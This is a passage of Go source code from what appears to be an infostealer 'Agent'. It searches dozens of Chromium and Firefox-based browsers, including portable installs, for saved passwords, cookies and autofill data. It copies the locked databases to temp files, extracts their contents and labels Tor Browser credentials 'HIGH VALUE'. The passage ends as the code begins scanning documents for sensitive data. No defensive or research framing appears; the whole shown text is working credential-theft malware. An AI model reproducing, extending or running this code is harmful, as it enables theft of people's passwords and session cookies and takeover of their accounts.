			os.Getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data",
			os.Getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Profile 1\\Login Data",
			os.Getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Profile 2\\Login Data",
			os.Getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Profile 3\\Login Data",
		},
		"Edge": {
			os.Getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Login Data",
			os.Getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Profile 1\\Login Data",
			os.Getenv("LOCALAPPDATA") + "\\Microsoft\\Edge Dev\\User Data\\Default\\Login Data",
			os.Getenv("LOCALAPPDATA") + "\\Microsoft\\Edge Beta\\User Data\\Default\\Login Data",
			os.Getenv("LOCALAPPDATA") + "\\Microsoft\\Edge Canary\\User Data\\Default\\Login Data",
		},
		"Brave": {
			os.Getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
			os.Getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Login Data",
			os.Getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser-Beta\\User Data\\Default\\Login Data",
			os.Getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser-Dev\\User Data\\Default\\Login Data",
		},
		"Thorium": {
			os.Getenv("LOCALAPPDATA") + "\\Thorium\\User Data\\Default\\Login Data",
			os.Getenv("LOCALAPPDATA") + "\\Thorium\\User Data\\Profile 1\\Login Data",
			"C:\\Program Files\\Thorium\\User Data\\Default\\Login Data",
			"C:\\Program Files (x86)\\Thorium\\User Data\\Default\\Login Data",
		},
		"Opera": {
			os.Getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Login Data",
			os.Getenv("APPDATA") + "\\Opera Software\\Opera Beta\\Login Data",
			os.Getenv("APPDATA") + "\\Opera Software\\Opera Developer\\Login Data",
		},
		"Opera GX": {
			os.Getenv("APPDATA") + "\\Opera Software\\Opera GX Stable\\Login Data",
			os.Getenv("APPDATA") + "\\Opera Software\\Opera GX Beta\\Login Data",
		},
		"Vivaldi": {
			os.Getenv("LOCALAPPDATA") + "\\Vivaldi\\User Data\\Default\\Login Data",
			os.Getenv("LOCALAPPDATA") + "\\Vivaldi\\User Data\\Profile 1\\Login Data",
		},
		"Yandex": {
			os.Getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data",
			os.Getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Login Data",
		},
		"UC Browser": {
			os.Getenv("LOCALAPPDATA") + "\\UCBrowser\\User Data\\Default\\Login Data",
		},
		"Chromium": {
			os.Getenv("LOCALAPPDATA") + "\\Chromium\\User Data\\Default\\Login Data",
			os.Getenv("LOCALAPPDATA") + "\\Chromium\\User Data\\Profile 1\\Login Data",
		},
		"Cent Browser": {
			os.Getenv("LOCALAPPDATA") + "\\CentBrowser\\User Data\\Default\\Login Data",
		},
		"SRWare Iron": {
			os.Getenv("LOCALAPPDATA") + "\\Chromium\\User Data\\Default\\Login Data",
			"C:\\Program Files\\SRWare Iron\\User Data\\Default\\Login Data",
			"C:\\Program Files (x86)\\SRWare Iron\\User Data\\Default\\Login Data",
		},
		"Comodo Dragon": {
			os.Getenv("LOCALAPPDATA") + "\\Comodo\\Dragon\\User Data\\Default\\Login Data",
		},
		"Torch Browser": {
			os.Getenv("LOCALAPPDATA") + "\\Torch\\User Data\\Default\\Login Data",
		},
		"Maxthon": {
			os.Getenv("LOCALAPPDATA") + "\\Maxthon3\\User Data\\Default\\Login Data",
			os.Getenv("LOCALAPPDATA") + "\\Maxthon5\\User Data\\Default\\Login Data",
		},
		"Slimjet": {
			os.Getenv("LOCALAPPDATA") + "\\Slimjet\\User Data\\Default\\Login Data",
		},
		"CocCoc": {
			os.Getenv("LOCALAPPDATA") + "\\CocCoc\\Browser\\User Data\\Default\\Login Data",
		},
		"Avast Secure Browser": {
			os.Getenv("LOCALAPPDATA") + "\\AVAST Software\\Browser\\User Data\\Default\\Login Data",
		},
		"AVG Secure Browser": {
			os.Getenv("LOCALAPPDATA") + "\\AVG\\Browser\\User Data\\Default\\Login Data",
		},
		"360 Chrome": {
			os.Getenv("LOCALAPPDATA") + "\\360Chrome\\Chrome\\User Data\\Default\\Login Data",
		},
		"QQBrowser": {
			os.Getenv("LOCALAPPDATA") + "\\Tencent\\QQBrowser\\User Data\\Default\\Login Data",
		},
		"Sogou Explorer": {
			os.Getenv("LOCALAPPDATA") + "\\Sogou\\SogouExplorer\\User Data\\Default\\Login Data",
		},
	}

	log.Printf("Checking %d Chromium-based browsers...", len(chromiumBrowsers))

	for browserName, paths := range chromiumBrowsers {
		for _, dbPath := range paths {
			log.Printf("Checking %s: %s", browserName, dbPath)

			if _, err := os.Stat(dbPath); os.IsNotExist(err) {
				continue
			}

			log.Printf("Found %s database: %s", browserName, dbPath)

			// Copy database to temp location (browsers lock the file)
			tempDB := os.TempDir() + "\\" + strings.ToLower(browserName) + "_temp_" + fmt.Sprintf("%d", time.Now().UnixNano()) + ".db"
			log.Printf("Copying to temp file: %s", tempDB)

			if err := a.copyFile(dbPath, tempDB); err != nil {
				log.Printf("Failed to copy %s database %s: %v", browserName, dbPath, err)
				lastError = err
				continue
			}
			defer os.Remove(tempDB)

			// Extract passwords from SQLite database
			log.Printf("Extracting passwords from %s: %s", browserName, tempDB)
			browserPasswords, err := a.extractPasswordsFromSQLite(tempDB, browserName)
			if err != nil {
				log.Printf("Failed to extract from %s %s: %v", browserName, dbPath, err)
				lastError = err
				continue
			}

			log.Printf("Successfully extracted %d passwords from %s %s", len(browserPasswords), browserName, dbPath)
			passwords = append(passwords, browserPasswords...)
		}
	}

	// Check for portable browser installations
	portablePaths := []string{
		os.Getenv("USERPROFILE") + "\\Desktop",
		os.Getenv("USERPROFILE") + "\\Downloads",
		"C:\\PortableApps",
		"D:\\PortableApps",
		"E:\\PortableApps",
	}

	log.Printf("Checking portable browser installations...")
	for _, basePath := range portablePaths {
		if _, err := os.Stat(basePath); os.IsNotExist(err) {
			continue
		}

		// Look for portable Chrome/Chromium installations
		portablePatterns := []string{
			basePath + "\\*Chrome*\\User Data\\Default\\Login Data",
			basePath + "\\*Chromium*\\User Data\\Default\\Login Data",
			basePath + "\\*Thorium*\\User Data\\Default\\Login Data",
			basePath + "\\*Browser*\\User Data\\Default\\Login Data",
			basePath + "\\*Opera*\\Login Data",
			basePath + "\\*Brave*\\User Data\\Default\\Login Data",
		}

		for _, pattern := range portablePatterns {
			matches, _ := filepath.Glob(pattern)
			for _, match := range matches {
				log.Printf("Found portable browser: %s", match)

				tempDB := os.TempDir() + "\\portable_temp_" + fmt.Sprintf("%d", time.Now().UnixNano()) + ".db"
				if err := a.copyFile(match, tempDB); err != nil {
					continue
				}
				defer os.Remove(tempDB)

				browserPasswords, err := a.extractPasswordsFromSQLite(tempDB, "Portable Browser")
				if err != nil {
					continue
				}

				log.Printf("Successfully extracted %d passwords from portable browser %s", len(browserPasswords), match)
				passwords = append(passwords, browserPasswords...)
			}
		}
	}

	if len(passwords) == 0 && lastError != nil {
		return passwords, fmt.Errorf("failed to extract from any Chromium database: %v", lastError)
	}

	log.Printf("Total Chromium passwords extracted: %d", len(passwords))
	return passwords, nil
}

// extractFirefoxPasswords extracts passwords from all Firefox-based browsers
func (a *Agent) extractFirefoxPasswords() ([]config.BrowserPassword, error) {
	var passwords []config.BrowserPassword

	// Comprehensive Firefox-based browser paths
	firefoxBrowsers := map[string]string{
		"Firefox":         os.Getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles",
		"Firefox ESR":     os.Getenv("APPDATA") + "\\Mozilla\\Firefox ESR\\Profiles",
		"Firefox Dev":     os.Getenv("APPDATA") + "\\Mozilla\\Firefox Developer Edition\\Profiles",
		"Firefox Nightly": os.Getenv("APPDATA") + "\\Mozilla\\Firefox Nightly\\Profiles",
		"Floorp":          os.Getenv("APPDATA") + "\\Floorp\\Profiles",
		"Waterfox":        os.Getenv("APPDATA") + "\\Waterfox\\Profiles",
		"Pale Moon":       os.Getenv("APPDATA") + "\\Moonchild Productions\\Pale Moon\\Profiles",
		"Basilisk":        os.Getenv("APPDATA") + "\\Moonchild Productions\\Basilisk\\Profiles",
		"LibreWolf":       os.Getenv("APPDATA") + "\\LibreWolf\\Profiles",
		"Tor Browser":     os.Getenv("APPDATA") + "\\tor browser\\Browser\\TorBrowser\\Data\\Browser\\profile.default",
		"SeaMonkey":       os.Getenv("APPDATA") + "\\Mozilla\\SeaMonkey\\Profiles",
		"IceCat":          os.Getenv("APPDATA") + "\\Mozilla\\IceCat\\Profiles",
		"K-Meleon":        os.Getenv("APPDATA") + "\\K-Meleon\\Profiles",
		"Cyberfox":        os.Getenv("APPDATA") + "\\8pecxstudios\\Cyberfox\\Profiles",
	}

	log.Printf("Checking %d Firefox-based browsers...", len(firefoxBrowsers))

	for browserName, basePath := range firefoxBrowsers {
		log.Printf("Checking %s: %s", browserName, basePath)

		// Special handling for Tor Browser (single profile)
		if browserName == "Tor Browser" {
			loginsPath := basePath + "\\logins.json"
			if _, err := os.Stat(loginsPath); err == nil {
				log.Printf("Found %s logins: %s", browserName, loginsPath)

				firefoxPasswords, err := a.extractFirefoxJSON(loginsPath)
				if err != nil {
					log.Printf("Failed to extract from %s: %v", browserName, err)
					continue
				}

				// Mark Tor Browser passwords specially (high value)
				for i := range firefoxPasswords {
					firefoxPasswords[i].Browser = "Tor Browser [HIGH VALUE]"
				}

				passwords = append(passwords, firefoxPasswords...)
				log.Printf("Successfully extracted %d passwords from %s", len(firefoxPasswords), browserName)
			}
			continue
		}

		// Check if browser directory exists
		if _, err := os.Stat(basePath); os.IsNotExist(err) {
			continue
		}

		// Find Firefox profiles
		profiles, err := filepath.Glob(basePath + "\\*")
		if err != nil {
			continue
		}

		for _, profile := range profiles {
			profileInfo, err := os.Stat(profile)
			if err != nil || !profileInfo.IsDir() {
				continue
			}

			loginsPath := profile + "\\logins.json"
			if _, err := os.Stat(loginsPath); os.IsNotExist(err) {
				continue
			}

			log.Printf("Found %s profile: %s", browserName, profile)

			// Extract from Firefox JSON format
			firefoxPasswords, err := a.extractFirefoxJSON(loginsPath)
			if err != nil {
				log.Printf("Failed to extract from %s profile %s: %v", browserName, profile, err)
				continue
			}

			// Update browser name to include specific browser
			for i := range firefoxPasswords {
				firefoxPasswords[i].Browser = browserName
			}

			passwords = append(passwords, firefoxPasswords...)
			log.Printf("Successfully extracted %d passwords from %s profile %s", len(firefoxPasswords), browserName, profile)
		}
	}

	// Check for portable Firefox installations
	portablePaths := []string{
		os.Getenv("USERPROFILE") + "\\Desktop",
		os.Getenv("USERPROFILE") + "\\Downloads",
		"C:\\PortableApps",
		"D:\\PortableApps",
		"E:\\PortableApps",
	}

	log.Printf("Checking portable Firefox installations...")
	for _, basePath := range portablePaths {
		if _, err := os.Stat(basePath); os.IsNotExist(err) {
			continue
		}

		// Look for portable Firefox installations
		portablePatterns := []string{
			basePath + "\\*Firefox*\\Data\\profile\\logins.json",
			basePath + "\\*Floorp*\\Data\\profile\\logins.json",
			basePath + "\\*Tor*\\Data\\Browser\\profile.default\\logins.json",
			basePath + "\\*Waterfox*\\Data\\profile\\logins.json",
			basePath + "\\*LibreWolf*\\Data\\profile\\logins.json",
		}

		for _, pattern := range portablePatterns {
			matches, _ := filepath.Glob(pattern)
			for _, match := range matches {
				log.Printf("Found portable Firefox browser: %s", match)

				firefoxPasswords, err := a.extractFirefoxJSON(match)
				if err != nil {
					continue
				}

				// Mark as portable
				for i := range firefoxPasswords {
					firefoxPasswords[i].Browser = "Portable Firefox"
				}

				passwords = append(passwords, firefoxPasswords...)
				log.Printf("Successfully extracted %d passwords from portable Firefox %s", len(firefoxPasswords), match)
			}
		}
	}

	// Check alternative Tor Browser locations
	torPaths := []string{
		"C:\\Users\\" + os.Getenv("USERNAME") + "\\Desktop\\Tor Browser\\Browser\\TorBrowser\\Data\\Browser\\profile.default\\logins.json",
		"C:\\Tor Browser\\Browser\\TorBrowser\\Data\\Browser\\profile.default\\logins.json",
		os.Getenv("USERPROFILE") + "\\Downloads\\Tor Browser\\Browser\\TorBrowser\\Data\\Browser\\profile.default\\logins.json",
	}

	log.Printf("Checking alternative Tor Browser locations...")
	for _, torPath := range torPaths {
		if _, err := os.Stat(torPath); err == nil {
			log.Printf("Found alternative Tor Browser: %s", torPath)

			firefoxPasswords, err := a.extractFirefoxJSON(torPath)
			if err != nil {
				continue
			}

			// Mark as Tor Browser (high value)
			for i := range firefoxPasswords {
				firefoxPasswords[i].Browser = "Tor Browser [HIGH VALUE]"
			}

			passwords = append(passwords, firefoxPasswords...)
			log.Printf("Successfully extracted %d passwords from alternative Tor Browser %s", len(firefoxPasswords), torPath)
		}
	}

	log.Printf("Total Firefox-based passwords extracted: %d", len(passwords))
	return passwords, nil
}

// extractEdgePasswords extracts passwords from Microsoft Edge
func (a *Agent) extractEdgePasswords() ([]config.BrowserPassword, error) {
	var passwords []config.BrowserPassword

	edgePath := os.Getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Login Data"

	if _, err := os.Stat(edgePath); os.IsNotExist(err) {
		return passwords, fmt.Errorf("Edge database not found")
	}

	// Copy database to temp location
	tempDB := os.TempDir() + "\\edge_temp.db"
	if err := a.copyFile(edgePath, tempDB); err != nil {
		return passwords, err
	}
	defer os.Remove(tempDB)

	// Extract passwords from SQLite database
	return a.extractPasswordsFromSQLite(tempDB, "Edge")
}

// extractChromeCookies extracts cookies from comprehensive list of Chromium-based browsers
func (a *Agent) extractChromeCookies() ([]config.BrowserCookie, error) {
	var cookies []config.BrowserCookie

	// Comprehensive Chromium-based browser cookie paths (matching password extraction)
	chromiumCookiePaths := map[string][]string{
		"Chrome": {
			os.Getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Network\\Cookies",
			os.Getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Profile 1\\Network\\Cookies",
			os.Getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Profile 2\\Network\\Cookies",
			os.Getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Profile 3\\Network\\Cookies",
		},
		"Edge": {
			os.Getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies",
			os.Getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\Cookies",
			os.Getenv("LOCALAPPDATA") + "\\Microsoft\\Edge Dev\\User Data\\Default\\Network\\Cookies",
			os.Getenv("LOCALAPPDATA") + "\\Microsoft\\Edge Beta\\User Data\\Default\\Network\\Cookies",
			os.Getenv("LOCALAPPDATA") + "\\Microsoft\\Edge Canary\\User Data\\Default\\Network\\Cookies",
		},
		"Brave": {
			os.Getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\Cookies",
			os.Getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\Cookies",
			os.Getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser-Beta\\User Data\\Default\\Network\\Cookies",
			os.Getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser-Dev\\User Data\\Default\\Network\\Cookies",
		},
		"Thorium": {
			os.Getenv("LOCALAPPDATA") + "\\Thorium\\User Data\\Default\\Network\\Cookies",
			os.Getenv("LOCALAPPDATA") + "\\Thorium\\User Data\\Profile 1\\Network\\Cookies",
		},
		"Opera": {
			os.Getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Network\\Cookies",
			os.Getenv("APPDATA") + "\\Opera Software\\Opera Beta\\Network\\Cookies",
			os.Getenv("APPDATA") + "\\Opera Software\\Opera Developer\\Network\\Cookies",
		},
		"Opera GX": {
			os.Getenv("APPDATA") + "\\Opera Software\\Opera GX Stable\\Network\\Cookies",
			os.Getenv("APPDATA") + "\\Opera Software\\Opera GX Beta\\Network\\Cookies",
		},
		"Vivaldi": {
			os.Getenv("LOCALAPPDATA") + "\\Vivaldi\\User Data\\Default\\Network\\Cookies",
			os.Getenv("LOCALAPPDATA") + "\\Vivaldi\\User Data\\Profile 1\\Network\\Cookies",
		},
		"Yandex": {
			os.Getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Default\\Network\\Cookies",
			os.Getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\Cookies",
		},
		"UC Browser": {
			os.Getenv("LOCALAPPDATA") + "\\UCBrowser\\User Data\\Default\\Network\\Cookies",
		},
		"Chromium": {
			os.Getenv("LOCALAPPDATA") + "\\Chromium\\User Data\\Default\\Network\\Cookies",
			os.Getenv("LOCALAPPDATA") + "\\Chromium\\User Data\\Profile 1\\Network\\Cookies",
		},
		"Cent Browser": {
			os.Getenv("LOCALAPPDATA") + "\\CentBrowser\\User Data\\Default\\Network\\Cookies",
		},
		"SRWare Iron": {
			os.Getenv("LOCALAPPDATA") + "\\Chromium\\User Data\\Default\\Network\\Cookies",
			"C:\\Program Files\\SRWare Iron\\User Data\\Default\\Network\\Cookies",
			"C:\\Program Files (x86)\\SRWare Iron\\User Data\\Default\\Network\\Cookies",
		},
		"Comodo Dragon": {
			os.Getenv("LOCALAPPDATA") + "\\Comodo\\Dragon\\User Data\\Default\\Network\\Cookies",
		},
		"Torch Browser": {
			os.Getenv("LOCALAPPDATA") + "\\Torch\\User Data\\Default\\Network\\Cookies",
		},
		"Maxthon": {
			os.Getenv("LOCALAPPDATA") + "\\Maxthon3\\User Data\\Default\\Network\\Cookies",
			os.Getenv("LOCALAPPDATA") + "\\Maxthon5\\User Data\\Default\\Network\\Cookies",
		},
		"Slimjet": {
			os.Getenv("LOCALAPPDATA") + "\\Slimjet\\User Data\\Default\\Network\\Cookies",
		},
		"CocCoc": {
			os.Getenv("LOCALAPPDATA") + "\\CocCoc\\Browser\\User Data\\Default\\Network\\Cookies",
		},
		"Avast Secure Browser": {
			os.Getenv("LOCALAPPDATA") + "\\AVAST Software\\Browser\\User Data\\Default\\Network\\Cookies",
		},
		"AVG Secure Browser": {
			os.Getenv("LOCALAPPDATA") + "\\AVG\\Browser\\User Data\\Default\\Network\\Cookies",
		},
		"360 Chrome": {
			os.Getenv("LOCALAPPDATA") + "\\360Chrome\\Chrome\\User Data\\Default\\Network\\Cookies",
		},
		"QQBrowser": {
			os.Getenv("LOCALAPPDATA") + "\\Tencent\\QQBrowser\\User Data\\Default\\Network\\Cookies",
		},
		"Sogou Explorer": {
			os.Getenv("LOCALAPPDATA") + "\\Sogou\\SogouExplorer\\User Data\\Default\\Network\\Cookies",
		},
		"Floorp": {
			os.Getenv("APPDATA") + "\\Floorp\\Profiles",
		},
	}

	log.Printf("Extracting cookies from %d Chromium-based browsers...", len(chromiumCookiePaths))

	for browserName, paths := range chromiumCookiePaths {
		for _, dbPath := range paths {
			if _, err := os.Stat(dbPath); os.IsNotExist(err) {
				continue
			}

			log.Printf("Found %s cookies: %s", browserName, dbPath)

			tempDB := os.TempDir() + "\\" + strings.ToLower(strings.ReplaceAll(browserName, " ", "_")) + "_cookies_temp_" + fmt.Sprintf("%d", time.Now().UnixNano()) + ".db"
			if err := a.copyFile(dbPath, tempDB); err != nil {
				log.Printf("Failed to copy %s cookies: %v", browserName, err)
				continue
			}
			defer os.Remove(tempDB)

			browserCookies, err := a.extractCookiesFromSQLite(tempDB, browserName)
			if err != nil {
				log.Printf("Failed to extract %s cookies: %v", browserName, err)
				continue
			}

			cookies = append(cookies, browserCookies...)
			log.Printf("Successfully extracted %d cookies from %s", len(browserCookies), browserName)
		}
	}

	// Check portable browser installations
	log.Printf("Checking portable browser installations...")
	portablePaths := []string{
		os.Getenv("USERPROFILE") + "\\Downloads",
		os.Getenv("USERPROFILE") + "\\Desktop",
		"C:\\PortableApps",
	}

	for _, basePath := range portablePaths {
		portablePattern := basePath + "\\*Chrome*\\User Data\\Default\\Network\\Cookies"
		if matches, err := filepath.Glob(portablePattern); err == nil {
			for _, match := range matches {
				tempDB := os.TempDir() + "\\portable_chrome_cookies_temp_" + fmt.Sprintf("%d", time.Now().UnixNano()) + ".db"
				if err := a.copyFile(match, tempDB); err == nil {
					if browserCookies, err := a.extractCookiesFromSQLite(tempDB, "Portable Chrome"); err == nil {
						cookies = append(cookies, browserCookies...)
					}
				}
				os.Remove(tempDB)
			}
		}
	}

	log.Printf("Total Chromium cookies extracted: %d", len(cookies))
	return cookies, nil
}

// extractFirefoxCookies extracts cookies from all Firefox-based browsers
func (a *Agent) extractFirefoxCookies() ([]config.BrowserCookie, error) {
	var cookies []config.BrowserCookie

	// Comprehensive Firefox-based browser paths (matching password extraction)
	firefoxBasePaths := map[string]string{
		"Firefox":         os.Getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles",
		"Firefox ESR":     os.Getenv("APPDATA") + "\\Mozilla\\Firefox ESR\\Profiles",
		"Firefox Dev":     os.Getenv("APPDATA") + "\\Mozilla\\Firefox Developer Edition\\Profiles",
		"Firefox Nightly": os.Getenv("APPDATA") + "\\Mozilla\\Firefox Nightly\\Profiles",
		"Waterfox":        os.Getenv("APPDATA") + "\\Waterfox\\Profiles",
		"Pale Moon":       os.Getenv("APPDATA") + "\\Moonchild Productions\\Pale Moon\\Profiles",
		"Basilisk":        os.Getenv("APPDATA") + "\\Moonchild Productions\\Basilisk\\Profiles",
		"LibreWolf":       os.Getenv("APPDATA") + "\\LibreWolf\\Profiles",
		"SeaMonkey":       os.Getenv("APPDATA") + "\\Mozilla\\SeaMonkey\\Profiles",
		"IceCat":          os.Getenv("APPDATA") + "\\Mozilla\\IceCat\\Profiles",
		"K-Meleon":        os.Getenv("APPDATA") + "\\K-Meleon\\Profiles",
		"Cyberfox":        os.Getenv("APPDATA") + "\\8pecxstudios\\Cyberfox\\Profiles",
		"Floorp":          os.Getenv("APPDATA") + "\\Floorp\\Profiles",
	}

	log.Printf("Checking %d Firefox-based browsers...", len(firefoxBasePaths))

	for browserName, basePath := range firefoxBasePaths {
		log.Printf("Checking %s: %s", browserName, basePath)
		profiles, err := filepath.Glob(basePath + "\\*")
		if err != nil {
			continue
		}

		for _, profile := range profiles {
			cookiesPath := profile + "\\cookies.sqlite"
			if _, err := os.Stat(cookiesPath); os.IsNotExist(err) {
				continue
			}

			log.Printf("Found %s cookies: %s", browserName, cookiesPath)

			tempDB := os.TempDir() + "\\" + strings.ToLower(strings.ReplaceAll(browserName, " ", "_")) + "_cookies_temp_" + fmt.Sprintf("%d", time.Now().UnixNano()) + ".db"
			if err := a.copyFile(cookiesPath, tempDB); err != nil {
				log.Printf("Failed to copy %s cookies: %v", browserName, err)
				continue
			}
			defer os.Remove(tempDB)

			firefoxCookies, err := a.extractFirefoxCookiesFromSQLite(tempDB, browserName)
			if err != nil {
				log.Printf("Failed to extract %s cookies: %v", browserName, err)
				continue
			}

			cookies = append(cookies, firefoxCookies...)
			log.Printf("Successfully extracted %d cookies from %s", len(firefoxCookies), browserName)
		}
	}

	// Special handling for Tor Browser (HIGH VALUE)
	log.Printf("Checking alternative Tor Browser locations...")
	torPaths := []string{
		os.Getenv("APPDATA") + "\\tor browser\\Browser\\TorBrowser\\Data\\Browser\\profile.default\\cookies.sqlite",
		os.Getenv("USERPROFILE") + "\\Desktop\\Tor Browser\\Browser\\TorBrowser\\Data\\Browser\\profile.default\\cookies.sqlite",
	}

	for _, torPath := range torPaths {
		if _, err := os.Stat(torPath); err == nil {
			log.Printf("Found Tor Browser cookies (HIGH VALUE): %s", torPath)
			tempDB := os.TempDir() + "\\tor_cookies_temp_" + fmt.Sprintf("%d", time.Now().UnixNano()) + ".db"
			if err := a.copyFile(torPath, tempDB); err == nil {
				if torCookies, err := a.extractFirefoxCookiesFromSQLite(tempDB, "Tor Browser"); err == nil {
					cookies = append(cookies, torCookies...)
					log.Printf("Successfully extracted %d cookies from Tor Browser", len(torCookies))
				}
			}
			os.Remove(tempDB)
		}
	}

	// Check portable Firefox installations
	log.Printf("Checking portable Firefox installations...")
	portablePaths := []string{
		os.Getenv("USERPROFILE") + "\\Downloads",
		os.Getenv("USERPROFILE") + "\\Desktop",
		"C:\\PortableApps",
	}

	for _, basePath := range portablePaths {
		portablePattern := basePath + "\\*Firefox*\\Data\\profile\\cookies.sqlite"
		if matches, err := filepath.Glob(portablePattern); err == nil {
			for _, match := range matches {
				tempDB := os.TempDir() + "\\portable_firefox_cookies_temp_" + fmt.Sprintf("%d", time.Now().UnixNano()) + ".db"
				if err := a.copyFile(match, tempDB); err == nil {
					if browserCookies, err := a.extractFirefoxCookiesFromSQLite(tempDB, "Portable Firefox"); err == nil {
						cookies = append(cookies, browserCookies...)
					}
				}
				os.Remove(tempDB)
			}
		}
	}

	log.Printf("Total Firefox-based cookies extracted: %d", len(cookies))
	return cookies, nil
}

// extractEdgeCookies extracts cookies from Microsoft Edge
func (a *Agent) extractEdgeCookies() ([]config.BrowserCookie, error) {
	edgePath := os.Getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"

	if _, err := os.Stat(edgePath); os.IsNotExist(err) {
		return nil, fmt.Errorf("Edge cookies database not found")
	}

	tempDB := os.TempDir() + "\\edge_cookies_temp.db"
	if err := a.copyFile(edgePath, tempDB); err != nil {
		return nil, err
	}
	defer os.Remove(tempDB)

	return a.extractCookiesFromSQLite(tempDB, "Edge")
}

// extractChromeAutofill extracts autofill data from Chrome
func (a *Agent) extractChromeAutofill() ([]config.AutofillData, error) {
	var autofill []config.AutofillData

	// Comprehensive Chromium-based browser autofill paths
	chromiumAutofillPaths := map[string][]string{
		"Chrome": {
			os.Getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Web Data",
			os.Getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Profile 1\\Web Data",
		},
		"Edge": {
			os.Getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Web Data",
			os.Getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Profile 1\\Web Data",
			os.Getenv("LOCALAPPDATA") + "\\Microsoft\\Edge Dev\\User Data\\Default\\Web Data",
		},
		"Brave": {
			os.Getenv("LOCALAPPDATA") + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Web Data",
		},
		"Thorium": {
			os.Getenv("LOCALAPPDATA") + "\\Thorium\\User Data\\Default\\Web Data",
			os.Getenv("LOCALAPPDATA") + "\\Thorium\\User Data\\Profile 1\\Web Data",
		},
		"Opera": {
			os.Getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Web Data",
		},
		"Opera GX": {
			os.Getenv("APPDATA") + "\\Opera Software\\Opera GX Stable\\Web Data",
		},
		"Vivaldi": {
			os.Getenv("LOCALAPPDATA") + "\\Vivaldi\\User Data\\Default\\Web Data",
		},
		"Yandex": {
			os.Getenv("LOCALAPPDATA") + "\\Yandex\\YandexBrowser\\User Data\\Default\\Web Data",
		},
		"Chromium": {
			os.Getenv("LOCALAPPDATA") + "\\Chromium\\User Data\\Default\\Web Data",
		},
		"Avast Secure Browser": {
			os.Getenv("LOCALAPPDATA") + "\\AVAST Software\\Browser\\User Data\\Default\\Web Data",
		},
		"AVG Secure Browser": {
			os.Getenv("LOCALAPPDATA") + "\\AVG\\Browser\\User Data\\Default\\Web Data",
		},
	}

	log.Printf("Extracting autofill from %d Chromium-based browsers...", len(chromiumAutofillPaths))

	for browserName, paths := range chromiumAutofillPaths {
		for _, dbPath := range paths {
			if _, err := os.Stat(dbPath); os.IsNotExist(err) {
				continue
			}

			log.Printf("Found %s autofill: %s", browserName, dbPath)

			tempDB := os.TempDir() + "\\" + strings.ToLower(browserName) + "_autofill_temp_" + fmt.Sprintf("%d", time.Now().UnixNano()) + ".db"
			if err := a.copyFile(dbPath, tempDB); err != nil {
				continue
			}
			defer os.Remove(tempDB)

			browserAutofill, err := a.extractAutofillFromSQLite(tempDB, browserName)
			if err != nil {
				continue
			}

			autofill = append(autofill, browserAutofill...)
			log.Printf("Successfully extracted %d autofill entries from %s", len(browserAutofill), browserName)
		}
	}

	log.Printf("Total Chromium autofill extracted: %d", len(autofill))
	return autofill, nil
}

// extractFirefoxAutofill extracts autofill data from Firefox
func (a *Agent) extractFirefoxAutofill() ([]config.AutofillData, error) {
	var autofill []config.AutofillData

	firefoxPath := os.Getenv("APPDATA") + "\\Mozilla\\Firefox\\Profiles"
	profiles, err := filepath.Glob(firefoxPath + "\\*")
	if err != nil {
		return autofill, err
	}

	for _, profile := range profiles {
		formhistoryPath := profile + "\\formhistory.sqlite"
		if _, err := os.Stat(formhistoryPath); os.IsNotExist(err) {
			continue
		}

		tempDB := os.TempDir() + "\\firefox_autofill_temp.db"
		if err := a.copyFile(formhistoryPath, tempDB); err != nil {
			continue
		}
		defer os.Remove(tempDB)

		firefoxAutofill, err := a.extractAutofillFromSQLite(tempDB, "Firefox")
		if err != nil {
			continue
		}
		autofill = append(autofill, firefoxAutofill...)
	}

	return autofill, nil
}

// scanDocumentsInPath scans documents in a specific path for sensitive data
func (a *Agent) scanDocumentsInPath(searchPath string, extensions []string) ([]config.DocumentPassword, error) {
	var documents []config.DocumentPassword

	if _, err := os.Stat(searchPath); os.IsNotExist(err) {
		return documents, nil // Path doesn't exist, return empty
	}

	err := filepath.Walk(searchPath, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil // Continue on errors
		}

		if info.IsDir() {
			return nil
		}

		// Check if file has target extension
